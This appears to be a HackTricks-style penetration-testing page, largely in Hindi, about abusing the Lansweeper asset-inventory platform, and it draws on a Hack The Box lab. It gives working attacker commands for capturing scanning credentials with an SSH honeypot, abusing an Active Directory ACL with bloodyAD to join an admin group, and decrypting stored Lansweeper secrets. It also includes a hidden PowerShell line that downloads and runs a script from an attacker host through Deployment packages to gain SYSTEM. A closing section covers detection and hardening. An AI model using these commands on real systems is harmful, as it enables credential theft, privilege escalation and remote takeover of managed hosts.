# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper एक IT asset discovery और inventory प्लेटफ़ॉर्म है जो आम तौर पर Windows पर डिप्लॉय किया जाता है और Active Directory के साथ इंटीग्रेट होता है। Lansweeper में कॉन्फ़िगर किए गए क्रेडेंशियल्स का उपयोग उसके scanning engines द्वारा SSH, SMB/WMI और WinRM जैसे प्रोटोकॉल्स पर assets को authenticate करने के लिए किया जाता है। Misconfigurations अक्सर निम्न की अनुमति देते हैं:

- किसी Scanning Target को attacker-controlled होस्ट (honeypot) पर रीडायरेक्ट करके credential interception
- Lansweeper-related groups द्वारा एक्सपोज़ किए गए AD ACLs का abuse करके रिमोट एक्सेस प्राप्त करना
- Lansweeper-कॉन्फ़िगर किए गए secrets (connection strings और stored scanning credentials) का on-host decryption
- Deployment फीचर के माध्यम से managed endpoints पर code execution (अक्सर SYSTEM के रूप में चल रहा होता है)

यह पेज एंगेजमेंट के दौरान इन व्यवहारों का दुरुपयोग करने के लिए व्यावहारिक attacker workflows और कमांड्स का सारांश देता है।

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: अपने होस्ट की ओर इशारा करने वाला एक Scanning Target बनाएं और मौजूदा Scanning Credentials को उससे map करें। जब scan चलेगा, Lansweeper उन क्रेडेंशियल्स से authenticate करने की कोशिश करेगा, और आपका honeypot उन प्रयासों को कैप्चर करेगा।

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
captured creds को DC services के खिलाफ मान्य करें:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- अन्य प्रोटोकॉल्स के लिए भी समान रूप से काम करता है जब आप scanner को अपने listener की ओर coercion कर सकें (SMB/WinRM honeypots, आदि)। SSH अक्सर सबसे सरल होता है।
- कई scanners खुद को अलग client banners के साथ पहचानते हैं (उदा., RebexSSH) और benign commands (uname, whoami, आदि) का प्रयास करेंगे।

## 2) AD ACL abuse: app-admin group में खुद को जोड़कर remote access प्राप्त करें

BloodHound का उपयोग करके compromised account से effective rights को enumerate करें। एक सामान्य खोज यह होती है कि कोई scanner- या app-specific group (उदा., “Lansweeper Discovery”) किसी privileged group (उदा., “Lansweeper Admins”) पर GenericAll रखता है। यदि वह privileged group “Remote Management Users” का member भी है, तो हम खुद को जोड़ते ही WinRM उपलब्ध हो जाता है।

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
BloodyAD (Linux) के साथ समूह पर GenericAll का Exploit:
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
फिर एक interactive shell प्राप्त करें:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
टिप: Kerberos संचालन समय-संवेदी होते हैं। अगर आपको KRB_AP_ERR_SKEW मिलता है, तो पहले DC के साथ समय समन्वय (sync) करें:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrypt Lansweeper-configured secrets on the host

Lansweeper सर्वर पर, ASP.NET साइट आमतौर पर एप्लिकेशन द्वारा उपयोग किए जाने वाले एक encrypted connection string और एक symmetric key को स्टोर करती है। उपयुक्त लोकल एक्सेस होने पर, आप DB connection string को decrypt करके स्टोर किए गए scanning credentials निकाल सकते हैं।

- सामान्य स्थान:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

SharpLansweeperDecrypt का उपयोग स्टोर किए गए creds को ऑटोमेटिकली decrypt और dump करने के लिए करें:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
अपेक्षित आउटपुट में DB connection details और plaintext scanning credentials जैसे पूरे estate में उपयोग किए जाने वाले Windows और Linux खाते शामिल होते हैं। ये अक्सर domain hosts पर elevated local rights रखते हैं:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
विशेषाधिकार प्राप्त पहुँच के लिए पुनर्प्राप्त Windows scanning creds का उपयोग करें:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“Lansweeper Admins” के सदस्य के रूप में, वेब UI में Deployment और Configuration उपलब्ध हैं। Deployment → Deployment packages के अंतर्गत, आप ऐसे packages बना सकते हैं जो लक्षित assets पर arbitrary commands चलाते हैं। निष्पादन Lansweeper service द्वारा उच्च privileges के साथ किया जाता है, जिससे चुने हुए host पर NT AUTHORITY\SYSTEM के रूप में code execution मिलती है।

High-level steps:
- एक नया Deployment package बनाएं जो PowerShell या cmd one-liner चलाए (reverse shell, add-user, etc.).
- इच्छित asset (e.g., the DC/host where Lansweeper runs) को लक्ष्य करें और Deploy/Run now पर क्लिक करें।
- अपने shell को SYSTEM के रूप में पकड़ें।

उदाहरण payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- डिप्लॉयमेंट क्रियाएँ शोर करती हैं और Lansweeper तथा Windows event logs में लॉग छोड़ती हैं। सावधानी से उपयोग करें।

## डिटेक्शन और हार्डनिंग

- अनाम SMB enumerations को सीमित या हटा दें। RID cycling और Lansweeper shares तक असामान्य पहुँच के लिए निगरानी रखें।
- Egress controls: scanner hosts से outbound SSH/SMB/WinRM को ब्लॉक या कड़ाई से सीमित करें। non-standard ports (e.g., 2022) और Rebex जैसे असामान्य client banners पर अलर्ट रखें।
- Protect `Website\\web.config` and `Key\\Encryption.txt`. secrets को vault में बाहरीकरण करें और एक्सपोज़ होने पर रोटेट करें। जहाँ संभव हो, न्यूनतम privileges वाले service accounts और gMSA पर विचार करें।
- AD monitoring: Lansweeper-संबंधित groups (उदा., “Lansweeper Admins”, “Remote Management Users”) में बदलावों पर अलर्ट करें और privileged groups पर GenericAll/Write सदस्यता देने वाले ACL परिवर्तनों पर निगरानी रखें।
- Deployment package के निर्माण/परिवर्तन/निष्पादन का ऑडिट करें; उन पैकेजों पर अलर्ट करें जो cmd.exe/powershell.exe लॉन्च करते हैं या अनपेक्षित outbound कनेक्शनों को आरंभ करते हैं।

## संबंधित विषय
- SMB/LSA/SAMR enumeration and RID cycling
- Kerberos password spraying and clock skew considerations
- BloodHound path analysis of application-admin groups
- WinRM usage and lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
